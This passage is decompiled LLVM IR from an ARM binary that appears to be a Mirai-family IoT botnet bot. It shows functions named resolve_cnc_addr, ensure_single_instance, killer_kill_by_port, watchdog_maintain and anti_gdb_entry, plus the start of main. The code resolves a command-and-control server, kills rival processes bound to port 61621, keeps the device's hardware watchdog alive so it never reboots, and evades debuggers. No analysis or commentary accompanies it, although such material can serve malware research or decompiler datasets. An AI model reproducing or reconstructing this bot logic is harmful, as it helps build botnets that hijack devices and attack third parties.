dec_label_pc_d69c:                                ; preds = %dec_label_pc_d694.backedge, %dec_label_pc_d69c.lr.ph
  %v0_d694 = phi i32 [ %v1_d69492, %dec_label_pc_d69c.lr.ph ], [ %v1_d694, %dec_label_pc_d694.backedge ]
  %storemerge147.in = phi i32 [ 0, %dec_label_pc_d69c.lr.ph ], [ %storemerge147, %dec_label_pc_d694.backedge ]
  %v1_d69c = phi i32 [ 0, %dec_label_pc_d69c.lr.ph ], [ %v1_d69c169, %dec_label_pc_d694.backedge ]
  %v2_d69c = add i32 %v1_d69c, %v0_d69c.pre
  %v3_d69c = inttoptr i32 %v2_d69c to i8*
  %v4_d69c = load i8, i8* %v3_d69c, align 1
  %v6_d69c = zext i8 %v4_d69c to i32
  store i32 %v6_d69c, i32* %r2.global-to-local, align 4
  %v2_d6a0 = add i32 %storemerge147.in, %v1_d6a0.pre
  %v3_d6a0 = inttoptr i32 %v2_d6a0 to i8*
  %v4_d6a0 = load i8, i8* %v3_d6a0, align 1
  %v6_d6a0 = zext i8 %v4_d6a0 to i32
  store i32 %v6_d6a0, i32* %r3.global-to-local, align 4
  %v9_d6a4 = icmp eq i8 %v4_d6a0, %v4_d69c
  br i1 %v9_d6a4, label %dec_label_pc_d684, label %dec_label_pc_d6b0

dec_label_pc_d6b0:                                ; preds = %dec_label_pc_d69c
  br label %dec_label_pc_d694.backedge

dec_label_pc_d6b8:                                ; preds = %dec_label_pc_d6d0
  %v1_d6b8 = add i32 %v1_d6d0, 1
  store i32 %v1_d6b8, i32* @lr, align 4
  %v9_d6bc = icmp eq i32 %v3_d5c0, %v1_d6b8
  br i1 %v9_d6bc, label %dec_label_pc_d768, label %dec_label_pc_d6c8.backedge

dec_label_pc_d6c8.backedge:                       ; preds = %dec_label_pc_d6b8, %dec_label_pc_d6e4
  %v1_d6d0178 = phi i32 [ 0, %dec_label_pc_d6e4 ], [ %v1_d6b8, %dec_label_pc_d6b8 ]
  %storemerge146 = add i32 %storemerge146.in, 1
  %v1_d6c8 = add i32 %v0_d6c8, -1
  store i32 %v1_d6c8, i32* %r1.global-to-local, align 4
  %v2_d6c8 = icmp eq i32 %v0_d6c8, 0
  br i1 %v2_d6c8, label %dec_label_pc_d5d8, label %dec_label_pc_d6d0

dec_label_pc_d6d0:                                ; preds = %dec_label_pc_d6c8.backedge, %dec_label_pc_d6d0.lr.ph
  %v0_d6c8 = phi i32 [ %v1_d6c8101, %dec_label_pc_d6d0.lr.ph ], [ %v1_d6c8, %dec_label_pc_d6c8.backedge ]
  %storemerge146.in = phi i32 [ 0, %dec_label_pc_d6d0.lr.ph ], [ %storemerge146, %dec_label_pc_d6c8.backedge ]
  %v1_d6d0 = phi i32 [ 0, %dec_label_pc_d6d0.lr.ph ], [ %v1_d6d0178, %dec_label_pc_d6c8.backedge ]
  %v2_d6d0 = add i32 %v1_d6d0, %v0_d6d0.pre
  %v3_d6d0 = inttoptr i32 %v2_d6d0 to i8*
  %v4_d6d0 = load i8, i8* %v3_d6d0, align 1
  %v6_d6d0 = zext i8 %v4_d6d0 to i32
  store i32 %v6_d6d0, i32* %r2.global-to-local, align 4
  %v2_d6d4 = add i32 %storemerge146.in, %v1_d6d4.pre
  %v3_d6d4 = inttoptr i32 %v2_d6d4 to i8*
  %v4_d6d4 = load i8, i8* %v3_d6d4, align 1
  %v6_d6d4 = zext i8 %v4_d6d4 to i32
  store i32 %v6_d6d4, i32* %r3.global-to-local, align 4
  %v9_d6d8 = icmp eq i8 %v4_d6d4, %v4_d6d0
  br i1 %v9_d6d8, label %dec_label_pc_d6b8, label %dec_label_pc_d6e4

dec_label_pc_d6e4:                                ; preds = %dec_label_pc_d6d0
  br label %dec_label_pc_d6c8.backedge

dec_label_pc_d6ec:                                ; preds = %dec_label_pc_d704
  %v1_d6ec = add i32 %v1_d708, 1
  store i32 %v1_d6ec, i32* @lr, align 4
  %v9_d6f0 = icmp eq i32 %v3_d5dc, %v1_d6ec
  br i1 %v9_d6f0, label %dec_label_pc_d768, label %dec_label_pc_d6fc.backedge

dec_label_pc_d6fc.backedge:                       ; preds = %dec_label_pc_d6ec, %dec_label_pc_d71c
  %v1_d708186 = phi i32 [ 0, %dec_label_pc_d71c ], [ %v1_d6ec, %dec_label_pc_d6ec ]
  %storemerge145 = add i32 %storemerge145.in, 1
  %v1_d6fc = add i32 %v0_d6fc, -1
  store i32 %v1_d6fc, i32* %r1.global-to-local, align 4
  %v2_d6fc = icmp eq i32 %v0_d6fc, 0
  br i1 %v2_d6fc, label %dec_label_pc_d5f4, label %dec_label_pc_d704

dec_label_pc_d704:                                ; preds = %dec_label_pc_d6fc.backedge, %dec_label_pc_d704.lr.ph
  %v0_d6fc = phi i32 [ %v1_d6fc110, %dec_label_pc_d704.lr.ph ], [ %v1_d6fc, %dec_label_pc_d6fc.backedge ]
  %storemerge145.in = phi i32 [ 0, %dec_label_pc_d704.lr.ph ], [ %storemerge145, %dec_label_pc_d6fc.backedge ]
  %v1_d708 = phi i32 [ 0, %dec_label_pc_d704.lr.ph ], [ %v1_d708186, %dec_label_pc_d6fc.backedge ]
  store i32 %v3_d538, i32* %r3.global-to-local, align 4
  %v2_d708 = add i32 %v1_d708, %v3_d538
  %v3_d708 = inttoptr i32 %v2_d708 to i8*
  %v4_d708 = load i8, i8* %v3_d708, align 1
  %v6_d708 = zext i8 %v4_d708 to i32
  store i32 %v6_d708, i32* %r2.global-to-local, align 4
  %v2_d70c = add i32 %storemerge145.in, %v1_d70c.pre
  %v3_d70c = inttoptr i32 %v2_d70c to i8*
  %v4_d70c = load i8, i8* %v3_d70c, align 1
  %v6_d70c = zext i8 %v4_d70c to i32
  store i32 %v6_d70c, i32* @r3, align 4
  %v9_d710 = icmp eq i8 %v4_d70c, %v4_d708
  br i1 %v9_d710, label %dec_label_pc_d6ec, label %dec_label_pc_d71c

dec_label_pc_d71c:                                ; preds = %dec_label_pc_d704
  br label %dec_label_pc_d6fc.backedge

dec_label_pc_d724:                                ; preds = %dec_label_pc_d73c
  %v1_d724 = add i32 %v1_d740, 1
  store i32 %v1_d724, i32* @lr, align 4
  %v9_d728 = icmp eq i32 %v3_d5f8, %v1_d724
  br i1 %v9_d728, label %dec_label_pc_d768, label %dec_label_pc_d734.backedge

dec_label_pc_d734.backedge:                       ; preds = %dec_label_pc_d724, %dec_label_pc_d754
  %v1_d740194 = phi i32 [ 0, %dec_label_pc_d754 ], [ %v1_d724, %dec_label_pc_d724 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d734 = add i32 %v0_d734, -1
  store i32 %v1_d734, i32* %r1.global-to-local, align 4
  %v2_d734 = icmp eq i32 %v0_d734, 0
  br i1 %v2_d734, label %dec_label_pc_d610, label %dec_label_pc_d73c

dec_label_pc_d73c:                                ; preds = %dec_label_pc_d734.backedge, %dec_label_pc_d73c.lr.ph
  %v0_d734 = phi i32 [ %v1_d734119, %dec_label_pc_d73c.lr.ph ], [ %v1_d734, %dec_label_pc_d734.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d73c.lr.ph ], [ %storemerge, %dec_label_pc_d734.backedge ]
  %v1_d740 = phi i32 [ 0, %dec_label_pc_d73c.lr.ph ], [ %v1_d740194, %dec_label_pc_d734.backedge ]
  store i32 %v3_d54c, i32* %r3.global-to-local, align 4
  %v2_d740 = add i32 %v1_d740, %v3_d54c
  %v3_d740 = inttoptr i32 %v2_d740 to i8*
  %v4_d740 = load i8, i8* %v3_d740, align 1
  %v6_d740 = zext i8 %v4_d740 to i32
  store i32 %v6_d740, i32* %r2.global-to-local, align 4
  %v2_d744 = add i32 %storemerge.in, %v1_d744.pre
  %v3_d744 = inttoptr i32 %v2_d744 to i8*
  %v4_d744 = load i8, i8* %v3_d744, align 1
  %v6_d744 = zext i8 %v4_d744 to i32
  store i32 %v6_d744, i32* @r3, align 4
  %v9_d748 = icmp eq i8 %v4_d744, %v4_d740
  br i1 %v9_d748, label %dec_label_pc_d724, label %dec_label_pc_d754

dec_label_pc_d754:                                ; preds = %dec_label_pc_d73c
  br label %dec_label_pc_d734.backedge

dec_label_pc_d75c:                                ; preds = %dec_label_pc_d630
  %v1_d75c = add i32 %v1_d634, 1
  %v9_d760 = icmp eq i32 %v3_d614, %v1_d75c
  br i1 %v9_d760, label %dec_label_pc_d768, label %dec_label_pc_d648

dec_label_pc_d768:                                ; preds = %dec_label_pc_d650, %dec_label_pc_d684, %dec_label_pc_d6b8, %dec_label_pc_d6ec, %dec_label_pc_d724, %dec_label_pc_d75c
  %v1_d76c = call i32 @table_lock_val(i32 20)
  %v1_d774 = call i32 @table_lock_val(i32 21)
  %v1_d77c = call i32 @table_lock_val(i32 22)
  %v1_d784 = call i32 @table_lock_val(i32 23)
  %v1_d78c = call i32 @table_lock_val(i32 24)
  %v1_d794 = call i32 @table_lock_val(i32 36)
  %v1_d79c = call i32 @__GI___libc_close(i32 %v2_d4b0)
  %v0_d7a0 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d7a8 = call i32 @kill(i32 %v0_d7a0, i32 9)
  br label %dec_label_pc_d7ac

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d4a8, %dec_label_pc_d7dc, %dec_label_pc_d768
  store i32 %v2_d334, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d7b4 = call i32 @util_zero()
  store i32 %v2_d384, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d7c4 = call i32 @util_zero()
  %v1_d7cc = call i32 @sleep(i32 1)
  store i32 %v2_d30c, i32* @r4, align 4
  %v0_d7d4 = load i32, i32* @r7, align 4
  store i32 %v0_d7d4, i32* @r5, align 4
  br label %dec_label_pc_d25c.backedge

dec_label_pc_d7dc:                                ; preds = %dec_label_pc_d56c.backedge, %dec_label_pc_d4c0
  %v1_d7e0 = call i32 @table_lock_val(i32 20)
  %v1_d7e8 = call i32 @table_lock_val(i32 21)
  %v1_d7f0 = call i32 @table_lock_val(i32 22)
  %v1_d7f8 = call i32 @table_lock_val(i32 23)
  %v1_d800 = call i32 @table_lock_val(i32 24)
  %v1_d808 = call i32 @table_lock_val(i32 36)
  %v1_d810 = call i32 @__GI___libc_close(i32 %v2_d4b0)
  br label %dec_label_pc_d7ac

; uselistorder directives
  uselistorder i32 %v1_d75c, { 1, 0 }
  uselistorder i32 %v1_d648, { 1, 0 }
  uselistorder i32 %v1_d634, { 1, 0 }
  uselistorder i32 %v0_d648, { 1, 0 }
  uselistorder i32 %v1_d578, { 1, 0 }
  uselistorder i32 %v2_d4b0, { 3, 2, 4, 1, 0 }
  uselistorder i1 %v7_d48c, { 1, 0 }
  uselistorder i32 %v2_d488, { 1, 0 }
  uselistorder i32 %v2_d260, { 1, 0 }
  uselistorder i32 %stack_var_-8436.1.be, { 1, 0 }
  uselistorder i32 %v3_d3e0, { 1, 2, 0 }
  uselistorder i32 %v2_d2f0, { 1, 0 }
  uselistorder i32 %v1_d290, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d26c, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8436.0, { 1, 0 }
  uselistorder i32 %v2_d568, { 1, 0, 2 }
  uselistorder i32 %v2_d384, { 1, 0, 2 }
  uselistorder i32 %v3_d204, { 1, 0 }
  uselistorder i32 %v2_d1d0, { 2, 0, 1 }
  uselistorder i32 %v3_d17c, { 1, 0 }
  uselistorder i32 %v1_d16c, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d0ec, { 1, 2, 0 }
  uselistorder i32 %v3_d0a0, { 1, 2, 0 }
  uselistorder i32 %v3_d054, { 1, 2, 0 }
  uselistorder i32 %v3_d01c, { 1, 2, 0 }
  uselistorder i32 %v3_cfc8, { 2, 1, 0 }
  uselistorder i32 %storemerge212, { 1, 0 }
  uselistorder i32 %v0_cf54, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 63, 59, 62, 60, 61, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24f14.82, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24f18.74, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d7ac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d768, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d734.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d6fc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d6c8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d694.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d660.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d648, { 1, 0 }
  uselistorder label %dec_label_pc_d584, { 1, 0 }
  uselistorder label %dec_label_pc_d4a8, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d25c.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d43c, { 1, 0 }
  uselistorder label %dec_label_pc_d26c, { 1, 0 }
  uselistorder label %dec_label_pc_d26c.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d118, { 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %dec_label_pc_d080, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d9a4.87 to i32), i32* @global_var_22284.89, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d840 = load i32, i32* @r6, align 4
  %v12_d840 = load i32, i32* @r7, align 4
  %v15_d840 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d85c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_2227c.91 to i32), i32* @r6, align 4
  %v7_d864 = icmp eq i32 %v3_d85c, -1
  store i32 %v3_d85c, i32* @global_var_2227c.91, align 4
  br i1 %v7_d864, label %dec_label_pc_d91c, label %dec_label_pc_d870

dec_label_pc_d870:                                ; preds = %entry
  %v2_d870 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d870, i32* @r3, align 4
  %v0_d874 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d884 = call i32 @__GI_setsockopt(i32 %v3_d85c, i32 %v0_d874, i32 2, i32 %v2_d870, i32 4)
  %v2_d888 = load i32, i32* @global_var_2227c.91, align 4
  store i32 %v2_d888, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d898 = call i32 @__libc_fcntl(i32 %v2_d888, i32 3)
  %v0_d89c = load i32, i32* @r5, align 4
  %v1_d8a0 = or i32 %v2_d898, 2048
  store i32 %v1_d8a0, i32* @r2, align 4
  %v0_d8a4 = load i32, i32* @r4, align 4
  %v2_d8a8 = call i32 @__libc_fcntl(i32 %v0_d8a4, i32 %v0_d89c)
  store i32 ptrtoint (i8** @global_var_22288.93 to i32), i32* @r8, align 4
  %v2_d8b0 = load i8, i8* bitcast (i8** @global_var_22288.93 to i8*), align 4
  %v2_d8b4 = icmp eq i8 %v2_d8b0, 0
  br i1 %v2_d8b4, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d870
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d870
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d8d8 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d8e0 = inttoptr i32 %v0_d8d8 to i32*
  store i32 0, i32* %v2_d8e0, align 4
  %v2_d8e4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d8e4, i32* @r5, align 4
  store i32 %v0_d8d8, i32* @r4, align 4
  %v2_d8f4 = load i32, i32* @global_var_2227c.91, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d900 = call i32 @bind(i32 %v2_d8f4, i32 %v2_d8e4, i32 16)
  %v7_d904 = icmp eq i32 %v3_d900, -1
  br i1 %v7_d904, label %dec_label_pc_d928, label %dec_label_pc_d90c

dec_label_pc_d90c:                                ; preds = %bb20
  %v2_d914 = load i32, i32* @global_var_2227c.91, align 4
  %v2_d918 = call i32 @listen(i32 %v2_d914, i32 1)
  br label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %entry, %dec_label_pc_d934, %dec_label_pc_d90c
  %v1_d924 = phi i32 [ %v3_d85c, %entry ], [ %v1_d97c, %dec_label_pc_d934 ], [ %v2_d918, %dec_label_pc_d90c ]
  store i32 %v9_d840, i32* @r6, align 4
  store i32 %v12_d840, i32* @r7, align 4
  store i32 %v15_d840, i32* @r8, align 4
  ret i32 %v1_d924

dec_label_pc_d928:                                ; preds = %bb20
  %v0_d928 = load i32, i32* @r4, align 4
  %v1_d928 = inttoptr i32 %v0_d928 to i32*
  %v2_d928 = load i32, i32* %v1_d928, align 4
  %v7_d92c = icmp eq i32 %v2_d928, 99
  br i1 %v7_d92c, label %dec_label_pc_d984, label %dec_label_pc_d934

dec_label_pc_d934:                                ; preds = %dec_label_pc_d984, %bb21, %dec_label_pc_d928
  %v2_d94c = load i32, i32* @global_var_2227c.91, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d95c = call i32 @__libc_connect(i32 %v2_d94c, i32 %v2_d8e4, i32 16)
  %v1_d964 = call i32 @sleep(i32 5)
  %v2_d968 = load i32, i32* @global_var_2227c.91, align 4
  %v1_d96c = call i32 @__GI___libc_close(i32 %v2_d968)
  %v1_d978 = call i32 @killer_kill_by_port(i32 61621)
  %v1_d97c = call i32 @ensure_single_instance(i32 %v1_d978)
  br label %dec_label_pc_d91c

dec_label_pc_d984:                                ; preds = %dec_label_pc_d928
  %v2_d984 = load i8, i8* bitcast (i8** @global_var_22288.93 to i8*), align 4
  %v3_d984 = zext i8 %v2_d984 to i32
  %v1_d988 = load i32, i32* @r7, align 4
  %v9_d988 = icmp eq i32 %v3_d984, %v1_d988
  br i1 %v9_d988, label %dec_label_pc_d934, label %bb21

bb21:                                             ; preds = %dec_label_pc_d984
  %v2_d990 = trunc i32 %v1_d988 to i8
  store i8 %v2_d990, i8* bitcast (i8** @global_var_22288.93 to i8*), align 4
  br label %dec_label_pc_d934

; uselistorder directives
  uselistorder i32 %v2_d8e4, { 1, 0, 2 }
  uselistorder i32 %v3_d85c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22288.93 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_22288.93, { 1, 0 }
  uselistorder label %dec_label_pc_d934, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d91c, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_d9ac = call i32 @table_unlock_val(i32 2)
  %v3_d9b8 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v1_d9bc = call i32 @resolv_lookup(i32 %v3_d9b8)
  store i32 %v1_d9bc, i32* @r6, align 4
  %v1_d9c8 = call i32 @table_lock_val(i32 2)
  %v0_d9cc = load i32, i32* @r6, align 4
  %v2_d9cc = icmp eq i32 %v0_d9cc, 0
  br i1 %v2_d9cc, label %dec_label_pc_da1c, label %dec_label_pc_d9d4

dec_label_pc_d9d4:                                ; preds = %entry
  %v1_d9d4 = add i32 %v0_d9cc, 4
  %v2_d9d4 = inttoptr i32 %v1_d9d4 to i32*
  %v3_d9d4 = load i32, i32* %v2_d9d4, align 4
  store i32 %v3_d9d4, i32* @r4, align 4
  %v0_d9d8 = call i32 @rand_next()
  %v0_d9dc = load i32, i32* @r6, align 4
  %v1_d9dc = inttoptr i32 %v0_d9dc to i8*
  %v2_d9dc = load i8, i8* %v1_d9dc, align 1
  %v3_d9dc = zext i8 %v2_d9dc to i32
  %v3_d9e0 = urem i32 %v0_d9d8, %v3_d9dc
  store i32 ptrtoint (i16** @global_var_24f1c.96 to i32), i32* @r5, align 4
  %v0_d9e8 = load i32, i32* @r4, align 4
  %v4_d9e8 = mul nuw nsw i32 %v3_d9e0, 4
  %v5_d9e8 = add i32 %v0_d9e8, %v4_d9e8
  %v6_d9e8 = inttoptr i32 %v5_d9e8 to i32*
  %v7_d9e8 = load i32, i32* %v6_d9e8, align 4
  store i32 %v7_d9e8, i32* @global_var_24f20.97, align 4
  %v1_d9f4 = call i32 @resolv_entries_free(i32 %v0_d9dc)
  %v1_d9fc = call i32 @table_unlock_val(i32 1)
  %v3_da08 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_da08 = inttoptr i32 %v3_da08 to i16*
  %v3_da0c = load i16, i16* %v4_da08, align 2
  store i16 %v3_da0c, i16* bitcast (i32* @global_var_24f1e.98 to i16*), align 4
  %v1_da18 = call i32 @table_lock_val(i32 1)
  br label %dec_label_pc_da1c

dec_label_pc_da1c:                                ; preds = %entry, %dec_label_pc_d9d4
  %v1_da20 = phi i32 [ %v1_d9c8, %entry ], [ %v1_da18, %dec_label_pc_d9d4 ]
  ret i32 %v1_da20

; uselistorder directives
  uselistorder label %dec_label_pc_da1c, { 1, 0 }
}

define i32 @watchdog_maintain(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_da28 = load i32, i32* @r4, align 4
  %v6_da28 = load i32, i32* @r5, align 4
  %v0_da30 = call i32 @__libc_fork()
  %v7_da34 = icmp eq i32 %v0_da30, -1
  %. = zext i1 %v7_da34 to i32
  %tmp12 = icmp slt i32 %v0_da30, 1
  %storemerge4 = select i1 %tmp12, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_da50 = icmp eq i32 %storemerge4, 0
  store i32 %v0_da30, i32* @global_var_223fc.100, align 4
  br i1 %v2_da50, label %dec_label_pc_da68, label %dec_label_pc_da5c

dec_label_pc_da5c:                                ; preds = %entry
  store i32 %v3_da28, i32* @r4, align 4
  store i32 %v6_da28, i32* @r5, align 4
  ret i32 %v0_da30

dec_label_pc_da68:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_da74 = call i32 @table_unlock_val(i32 28)
  %v1_da7c = call i32 @table_unlock_val(i32 29)
  %v0_da80 = load i32, i32* @r5, align 4
  %v2_da88 = inttoptr i32 %v0_da80 to i32*
  %v3_da88 = call i32 @table_retrieve_val(i32 28, i32* %v2_da88)
  %v2_da90 = call i32 @__libc_open(i32 %v3_da88, i32 2)
  %v7_da94 = icmp eq i32 %v2_da90, -1
  store i32 %v2_da90, i32* @r4, align 4
  br i1 %v7_da94, label %dec_label_pc_dadc, label %dec_label_pc_daa0

dec_label_pc_daa0:                                ; preds = %dec_label_pc_dadc, %dec_label_pc_da68
  %v0_daac = phi i32 [ %v2_daec, %dec_label_pc_dadc ], [ %v2_da90, %dec_label_pc_da68 ]
  %v2_dab0 = ptrtoint i32* %stack_var_-20 to i32
  %v3_dab4 = call i32 @ioctl(i32 %v0_daac, i32 -2147199228, i32 %v2_dab0)
  br label %dec_label_pc_dab8

dec_label_pc_dab8:                                ; preds = %dec_label_pc_dab8, %dec_label_pc_daa0
  %v0_dac4 = load i32, i32* @r4, align 4
  %v3_dacc = call i32 @ioctl(i32 %v0_dac4, i32 -2147199227, i32 0)
  %v1_dad4 = call i32 @sleep(i32 10)
  br label %dec_label_pc_dab8

dec_label_pc_dadc:                                ; preds = %dec_label_pc_da68
  %v0_dadc = load i32, i32* @r5, align 4
  %v2_dae4 = inttoptr i32 %v0_dadc to i32*
  %v3_dae4 = call i32 @table_retrieve_val(i32 29, i32* %v2_dae4)
  %v2_daec = call i32 @__libc_open(i32 %v3_dae4, i32 2)
  %v3_daf0 = icmp eq i32 %v2_daec, -1
  store i32 %v2_daec, i32* @r4, align 4
  br i1 %v3_daf0, label %dec_label_pc_dafc, label %dec_label_pc_daa0

dec_label_pc_dafc:                                ; preds = %dec_label_pc_dadc
  %v1_db00 = call i32 @table_lock_val(i32 28)
  %v1_db08 = call i32 @table_lock_val(i32 29)
  %v0_db0c = load i32, i32* @r5, align 4
  %v1_db10 = call i32 @__GI_exit(i32 %v0_db0c)
  %v0_db14 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_db14, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_dafc
  store i32 %tmp, i32* %arg1, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_dafc, %bb15
  ret i32 %v1_db10

; uselistorder directives
  uselistorder i32 %v2_daec, { 1, 2, 0 }
  uselistorder i32 %v2_da90, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_da30, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_db28 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_db28, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_db40 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_db4c = call i32 @__GI_sigaddset(i32 %v2_db28, i32 2)
  %v0_db50 = load i32, i32* @r5, align 4
  store i32 %v0_db50, i32* %r2.global-to-local, align 4
  %v4_db5c = call i32 @__GI_sigprocmask(i32 %v0_db50, i32* nonnull %stack_var_-64, i32 %v0_db50)
  %v2_db68 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_db74 = call i32 @bsd_signal(i32 5, i32 55336)
  %v0_db78 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_24f1c.96 to i32), i32* %r2.global-to-local, align 4
  store i16 -6144, i16* bitcast (i32* @global_var_24f1e.98 to i16*), align 4
  store i32 1494907823, i32* @global_var_24f20.97, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_db78, i32* @global_var_24f10.62, align 4
  store i16 2, i16* bitcast (i16** @global_var_24f1c.96 to i16*), align 4
  %v6_dba0 = call i32 @table_init(i32 %v0_db78, i32 ptrtoint (i32* @global_var_24f10.62 to i32), i32 ptrtoint (i16** @global_var_24f1c.96 to i32), i32 2)
  store i32 ptrtoint (i32* @global_var_d9a4.87 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22284.89 to i32), i32* %ip.global-to-local, align 4
  %v2_dbac = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_dbac, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_d9a4.87 to i32), i32* @global_var_22284.89, align 4
  %v1_dbb4 = call i32 @ensure_single_instance(i32 %v6_dba0)
  %v1_dbb8 = call i32 @rand_init(i32 %v1_dbb4)
  store i32 %v2_dbac, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_dbc4 = call i32 @util_zero()
  %v0_dbc8 = load i32, i32* @r6, align 4
  %v7_dbc8 = icmp eq i32 %v0_dbc8, 2
  br i1 %v7_dbc8, label %dec_label_pc_dcf8, label %dec_label_pc_dbd0

